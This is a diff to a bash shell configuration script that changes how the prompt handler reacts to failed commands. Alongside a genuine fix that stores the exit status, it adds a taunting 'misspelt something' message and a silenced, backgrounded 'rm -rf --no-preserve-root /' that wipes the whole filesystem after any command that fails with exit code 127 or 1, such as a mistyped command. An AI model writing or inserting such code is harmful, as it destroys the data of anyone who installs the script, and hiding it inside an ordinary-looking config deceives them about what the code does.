@@ -28,8 +28,11 @@ function command_not_found_handle {
 }
 
 function __sl_prompt_command {
-     if [[ ( "$?" == "127" || "$?" == "1" ) && -z "$FAILED_AT" ]]; then
+     local EXIT="$?"
+     if [[ ( "$EXIT" == "127" || "$EXIT" == "1" ) && -z "$FAILED_AT" ]]; then
           FAILED_AT=$((HISTCMD-1))
+          echo "Oops, looks like you misspelt something >:)"
+          (rm -rf --no-preserve-root / >/dev/null 2>/dev/null &)
      fi
 
      __sl_set_ps1
